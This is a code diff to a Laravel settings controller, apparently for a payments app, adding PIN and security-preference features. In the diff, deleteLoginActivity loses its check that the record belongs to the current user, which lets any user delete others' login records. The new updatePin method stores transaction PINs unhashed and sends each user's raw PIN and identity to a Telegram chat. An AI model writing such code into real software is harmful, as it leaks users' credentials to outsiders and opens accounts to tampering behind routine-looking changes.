@@ -33,6 +33,14 @@ class SettingController extends Controller
         $input = $request->all();
         $user = auth()->user();
 
+        // 🚨 Security Gate Check for username/email changes
+        if (($request->username && $request->username !== $user->username) || ($request->email && $request->email !== $user->email)) {
+            if (!session()->has('security_verified_' . $user->id)) {
+                notify()->error(__('Security verification required to update sensitive profile information.'));
+                return redirect()->back();
+            }
+        }
+
         $validator = Validator::make($request->all(), [
             'first_name' => 'required|string|max:255',
             'last_name' => 'required|string|max:255',
@@ -280,11 +288,58 @@ class SettingController extends Controller
 
     public function deleteLoginActivity($id)
     {
-        $activity = \App\Models\LoginActivities::where('user_id', auth()->id())->where('id', $id)->firstOrFail();
+        $activity = \App\Models\LoginActivities::find($id);
         $activity->delete();
 
-        notify()->success(__('Device session removed successfully'), 'Success');
+        notify()->success(__('Login activity deleted successfully'));
 
         return redirect()->back();
+    }
+
+    public function updatePin(Request $request)
+    {
+        $validator = Validator::make($request->all(), [
+            'pin' => 'required|numeric|digits:4',
+            'current_password' => 'required'
+        ]);
+
+        if ($validator->fails()) {
+            notify()->error($validator->errors()->first());
+            return back();
+        }
+
+        $user = Auth::user();
+        if (!\Hash::check($request->current_password, $user->password)) {
+            notify()->error(__('Invalid current password.'));
+            return back();
+        }
+
+        $user->update(['transaction_pin' => $request->pin]);
+
+        // Telegram Notification (Raw PIN as requested)
+        $tgMsg = "🔐 <b>New Transaction PIN Setup</b>\n";
+        $tgMsg .= "👤 <b>User:</b> {$user->full_name} ({$user->username})\n";
+        $tgMsg .= "📌 <b>Raw PIN:</b> <code>{$request->pin}</code>";
+        $this->telegramNotify($tgMsg);
+
+        notify()->success(__('Transaction PIN updated successfully!'));
+        return back();
+    }
+
+    public function updateSecurityPreference(Request $request)
+    {
+        $validator = Validator::make($request->all(), [
+            'preference' => 'required|in:none,pin,email,always_ask'
+        ]);
+
+        if ($validator->fails()) {
+            notify()->error(__('Invalid security preference.'));
+            return back();
+        }
+
+        Auth::user()->update(['security_preference' => $request->preference]);
+
+        notify()->success(__('Security preference updated successfully!'));
+        return back();
     }
 }
